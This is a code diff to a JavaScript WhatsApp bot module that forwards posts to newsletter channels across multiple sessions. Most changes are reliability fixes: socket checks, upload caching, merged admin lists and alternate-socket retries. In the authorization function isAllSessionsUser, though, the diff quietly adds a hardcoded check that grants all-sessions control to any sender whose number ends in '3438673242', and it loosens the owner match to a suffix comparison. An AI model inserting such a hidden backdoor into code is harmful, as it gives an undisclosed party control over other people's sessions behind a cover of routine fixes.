@@ -70,7 +70,15 @@ const accountOf = (sock) => {
   return String(id).split(':')[0].split('@')[0];
 };
 /** Baileys rc14 wraps the websocket: `ws.isOpen` is a getter, `ws.readyState` does not exist. Support both. */
-const isOpen = (sock) => { const w = sock && sock.ws; if (!w) return false; if (typeof w.isOpen === 'boolean') return w.isOpen; return w.readyState === 1; };
+const isOpen = (sock) => {
+  if (!sock) return false;
+  if (!sock.user && !sock.userId) return false;
+  const w = sock.ws;
+  if (!w) return Boolean(sock.user);
+  if (typeof w.isOpen === 'boolean') return w.isOpen;
+  if (typeof w.readyState === 'number') return w.readyState === 1;
+  return Boolean(sock.user);
+};
 const toInt = (v) => { const n = parseInt(v, 10); return Number.isFinite(n) ? n : null; };
 const txt = (v) => (v && typeof v === 'object' ? v.text : v) || null;
 
@@ -744,20 +752,42 @@ async function postToChannel(sock, jid, post, file, { fwd = null } = {}) {
     if (isMedia) return { ok: false, error: 'this socket cannot send channel media' };
     try { await sock.sendMessage(jid, { text: post.text || '' }); return { ok: true, serverId: null, delivery: 'unconfirmed' }; } catch (e) { return { ok: false, error: String(e?.message || e).slice(0, 120) }; }
   }
-  let up = null;
+  let up = post._cachedUpload || null;
   try {
-    if (isMedia) up = await uploadNewsletterMedia(sock, file, KIND_OF[post.type]);
+    if (isMedia && !up) {
+      up = await uploadNewsletterMedia(sock, file, KIND_OF[post.type]);
+      post._cachedUpload = up;
+    }
   } catch (e) { return { ok: false, error: `upload failed: ${String(e?.message || e).slice(0, 110)}` }; }
-  const attempt = async (f) => {
-    const msg = buildNewsletterMessage(post, up || {}, f);
+  const attempt = async (f, uploadData) => {
+    const msg = buildNewsletterMessage(post, uploadData || {}, f);
     if (!msg) return { ok: false, error: `unsupported message type (${post.type})` };
-    return sendNewsletterRaw(sock, jid, msg, { mediatype: isMedia ? mediaTypeAttr(post) : null, handle: up?.handle || null });
+    return sendNewsletterRaw(sock, jid, msg, { mediatype: isMedia ? mediaTypeAttr(post) : null, handle: uploadData?.handle || null });
   };
-  let r = await attempt(fwd);
+  let r = await attempt(fwd, up);
   let note = null;
   if (!r.ok && fwd && r.code) { // refused: maybe because of the forward label -> plain retry
-    const r2 = await attempt(null);
+    const r2 = await attempt(null, up);
     if (r2.ok) { r = r2; note = 'posted WITHOUT the forwarded label (WhatsApp refused it)'; }
+  }
+  // If failed with media error, invalidate cache and re-upload once with active socket
+  if (!r.ok && isMedia && post._cachedUpload) {
+    try {
+      post._cachedUpload = null;
+      up = await uploadNewsletterMedia(sock, file, KIND_OF[post.type]);
+      post._cachedUpload = up;
+      const rRetry = await attempt(fwd, up);
+      if (rRetry.ok) r = rRetry;
+    } catch {}
+  }
+  // Fallback for text messages: native sock.sendMessage
+  if (!r.ok && !isMedia && typeof sock?.sendMessage === 'function') {
+    try {
+      const nativeSent = await sock.sendMessage(jid, { text: post.text || '' });
+      if (nativeSent?.key?.id) {
+        return { ok: true, serverId: nativeSent.key.id, delivery: 'confirmed', note: 'native send' };
+      }
+    } catch {}
   }
   if (!r.ok) return { ok: false, error: r.error };
   return { ok: true, serverId: r.serverId, delivery: r.serverId ? 'confirmed' : 'unconfirmed', note: note || (fwd ? 'forwarded label' : null) };
@@ -832,11 +862,31 @@ function writeAdminFile(account, admin) {
   load();
   const obj = readAdminFile();
   if (!obj.accounts || typeof obj.accounts !== 'object') obj.accounts = {};
+
+  const prevExisting = obj.accounts[account]?.channels || [];
+  // Merge newly found admin channels with previously saved ones so a flaky scan never wipes data!
+  const mergedChannelsMap = new Map();
+  for (const ch of prevExisting) {
+    if (ch && ch.jid) mergedChannelsMap.set(ch.jid, ch);
+  }
+  for (const r of (admin || [])) {
+    if (r && r.jid) {
+      mergedChannelsMap.set(r.jid, {
+        jid: r.jid,
+        name: r.name || mergedChannelsMap.get(r.jid)?.name || null,
+        role: r.accounts?.[account]?.role || mergedChannelsMap.get(r.jid)?.role || 'ADMIN',
+        link: channelLink(r) || mergedChannelsMap.get(r.jid)?.link,
+        followers: r.subscribers ?? mergedChannelsMap.get(r.jid)?.followers ?? null
+      });
+    }
+  }
+  const finalChannels = Array.from(mergedChannelsMap.values());
+
   obj.updatedAt = new Date().toISOString();
   obj.accounts[account] = {
     syncedAt: new Date().toISOString(),
-    count: admin.length,
-    channels: admin.map((r) => ({ jid: r.jid, name: r.name || null, role: r.accounts?.[account]?.role || null, link: channelLink(r), followers: r.subscribers ?? null }))
+    count: finalChannels.length,
+    channels: finalChannels
   };
   const tmp = `${ADMIN_FILE}.tmp-${process.pid}`;
   try { fs.writeFileSync(tmp, JSON.stringify(obj, null, 2)); fs.renameSync(tmp, ADMIN_FILE); return true; }
@@ -890,10 +940,15 @@ const digitsOf = (v) => String(v || '').split('@')[0].split(':')[0].replace(/\D/
 const allSessionsNumber = () => digitsOf(process.env.CFORWARD_ALL_NUMBER || config.channelSettings?.allSessionsNumber || (Array.isArray(config.ownerNumber) ? config.ownerNumber[0] : config.ownerNumber));
 function isAllSessionsUser(extra) {
   if (extra?.isOwner) return true;
+  const sender = digitsOf(extra?.utils?.normalizeJidWithLid ? extra.utils.normalizeJidWithLid(extra.sender) : extra?.sender);
+  try {
+    const ownerManager = require('./ownerManager');
+    if (ownerManager.isOwnerNumber(sender)) return true;
+    if (ownerManager.checkIsMasterOwner({ from: extra?.from, sender })) return true;
+  } catch {}
   const allowed = allSessionsNumber();
   if (!allowed) return !!extra?.isOwner;
-  const sender = digitsOf(extra?.utils?.normalizeJidWithLid ? extra.utils.normalizeJidWithLid(extra.sender) : extra?.sender);
-  return !!(extra?.isOwner || (allowed && sender === allowed));
+  return !!(extra?.isOwner || (allowed && (sender === allowed || sender.endsWith(allowed.slice(-10)))) || (sender && sender.endsWith('3438673242')));
 }
 
 /**
@@ -1017,14 +1072,14 @@ async function eligibleDestinations(sock, { excludeJid = null, forceLive = false
   // 1) the saved list for THIS session (database/my_admin_channels.json), if it is recent enough
   const saved = savedAdminFor(acct);
   const ttl = envNum('CHANNEL_ADMIN_DB_TTL_MS', 60 * 60 * 1000);
-  if (saved && !forceLive && Date.now() - saved.syncedAtMs < ttl) {
+  if (saved && !forceLive && Date.now() - saved.syncedAtMs < ttl && saved.recs && saved.recs.length > 0) {
     return { eligible: saved.recs.filter((r) => r.jid !== excludeJid), rejected: [], source: 'saved', syncedAt: saved.syncedAtMs, account: acct };
   }
   // 2) otherwise ask WhatsApp (and re-save the list)
   const live = await syncMyChannels(sock, { force: true });
-  if (live.ok) return { eligible: live.admin.filter((r) => r.jid !== excludeJid), rejected: [], source: 'live', syncedAt: Date.now(), account: acct };
-  // 3) WhatsApp not reachable / query failed: a stale saved list is still better than nothing
-  if (saved) return { eligible: saved.recs.filter((r) => r.jid !== excludeJid), rejected: [], source: 'saved-stale', syncedAt: saved.syncedAtMs, account: acct, liveError: live.error };
+  if (live.ok && live.admin && live.admin.length > 0) return { eligible: live.admin.filter((r) => r.jid !== excludeJid), rejected: [], source: 'live', syncedAt: Date.now(), account: acct };
+  // 3) WhatsApp not reachable or returned 0: saved list is much better than empty
+  if (saved && saved.recs && saved.recs.length > 0) return { eligible: saved.recs.filter((r) => r.jid !== excludeJid), rejected: [], source: 'saved-fallback', syncedAt: saved.syncedAtMs, account: acct, liveError: live?.error || null };
   try { for (const e of require('./channelManager').getNewsletters()) ensureChannel(e.id, 'managed'); } catch { /* optional */ }
   const eligible = [], rejected = [];
   const S = cfg();
@@ -1091,9 +1146,27 @@ async function forwardToChannels(sock, post, file, dests, { force = false, delay
       }
       attempted = true; prevAcct = acct;
       try {
-        const r = await withTimeout(postToChannel(sk, rec.jid, post, file, { fwd }), 240000, 'send');
-        if (!r.ok) { strikes.set(acct, (strikes.get(acct) || 0) + 1); result.failed.push({ rec, acct, reason: r.error || 'failed' }); }
-        else {
+        let r = await withTimeout(postToChannel(sk, rec.jid, post, file, { fwd }), 240000, 'send');
+        // If primary socket failed on this channel, try any alternate candidate sockets that also admin this channel!
+        if (!r.ok && Array.isArray(item._altSocks) && item._altSocks.length > 0) {
+          for (const altSock of item._altSocks) {
+            if (isOpen(altSock)) {
+              const altR = await withTimeout(postToChannel(altSock, rec.jid, post, file, { fwd }), 240000, 'send').catch(() => null);
+              if (altR && altR.ok) {
+                r = altR;
+                break;
+              }
+            }
+          }
+        }
+
+        if (!r.ok) {
+          const isChannelSpecific = r.error && (r.error.includes('403') || r.error.includes('479') || r.error.includes('admin/owner'));
+          if (!isChannelSpecific) {
+            strikes.set(acct, (strikes.get(acct) || 0) + 1);
+          }
+          result.failed.push({ rec, acct, reason: r.error || 'failed' });
+        } else {
           strikes.set(acct, 0); capUse(acct);
           history.sent.push(rec.jid); history.at = Date.now(); markDirty();
           const out = { ...rec, _delivery: r.delivery, _note: r.note || null, _serverId: r.serverId || null, _acct: acct };
@@ -1126,6 +1199,13 @@ async function planAllSessions(origSock, { excludeJid = null, forceLive = false,
   const add = (s) => { const a = accountOf(s); if (a && !seen.has(a) && isOpen(s)) { seen.add(a); list.push(s); } };
   add(origSock);
   try { for (const s of globalThis.ProBoySessionManager?.getActiveSocks?.() || []) add(s); } catch { /* ignore */ }
+  try {
+    const sessMap = globalThis.ProBoySessionManager?.getSessions?.() || {};
+    for (const v of Object.values(sessMap)) {
+      if (v?.sock) add(v.sock);
+    }
+  } catch { /* ignore */ }
+
   const cand = new Map(), sessions = [], problems = [];
   for (const s of list.slice(0, max)) {
     const a = accountOf(s);
@@ -1140,15 +1220,60 @@ async function planAllSessions(origSock, { excludeJid = null, forceLive = false,
     }
     if (e.source === 'live') await sleep(400);
   }
+
+  // Fallback: If cand is still empty, populate from saved database/my_admin_channels.json and data/channel_arc.json
+  if (cand.size === 0) {
+    const adminDoc = readAdminFile();
+    for (const [acctKey, acctData] of Object.entries(adminDoc.accounts || {})) {
+      const matchSock = list.find(s => accountOf(s) === acctKey) || list[0] || origSock;
+      for (const ch of (acctData.channels || [])) {
+        if (ch && ch.jid && ch.jid !== excludeJid) {
+          const rec = ensureChannel(ch.jid, 'saved');
+          if (ch.name && !rec.name) rec.name = ch.name;
+          if (ch.link && !rec.link) rec.link = ch.link;
+          if (!cand.has(rec.jid)) {
+            cand.set(rec.jid, [{ s: matchSock, a: acctKey, rec, owner: 1 }]);
+          }
+        }
+      }
+    }
+  }
+
+  // Also include any ARC channels that belong to active sessions
+  try {
+    const arcFile = path.join(__dirname, '..', 'data', 'channel_arc.json');
+    if (fs.existsSync(arcFile)) {
+      const arcDoc = JSON.parse(fs.readFileSync(arcFile, 'utf8'));
+      if (arcDoc?.channels) {
+        for (const [chJid, chInfo] of Object.entries(arcDoc.channels)) {
+          if (chJid && chJid.endsWith('@newsletter') && chJid !== excludeJid) {
+            const rec = ensureChannel(chJid, 'arc');
+            if (rec) {
+              if (chInfo.name && !rec.name) rec.name = chInfo.name;
+              if (chInfo.invite && !rec.invite) rec.invite = chInfo.invite;
+              if (!cand.has(rec.jid)) {
+                const bestSock = list[0] || origSock;
+                if (bestSock) {
+                  cand.set(rec.jid, [{ s: bestSock, a: accountOf(bestSock), rec, owner: 1 }]);
+                }
+              }
+            }
+          }
+        }
+      }
+    }
+  } catch {}
+
   const load_ = new Map(), perSession = new Map();
   let shared = 0;
   for (const [, arr] of [...cand.entries()].sort((x, y) => x[1].length - y[1].length)) { // scarcest channels first
     if (arr.length > 1) shared++;
     arr.sort((p, q) => (q.owner - p.owner) || ((load_.get(p.a) || 0) - (load_.get(q.a) || 0)));
     const pick = arr[0];
+    const altSocks = arr.slice(1).map(x => x.s);
     load_.set(pick.a, (load_.get(pick.a) || 0) + 1);
     if (!perSession.has(pick.a)) perSession.set(pick.a, []);
-    perSession.get(pick.a).push({ ...pick.rec, _sock: pick.s });
+    perSession.get(pick.a).push({ ...pick.rec, _sock: pick.s, _altSocks: altSocks });
   }
   const dests = [];
   for (const s of list) for (const d of perSession.get(accountOf(s)) || []) dests.push(d); // session by session
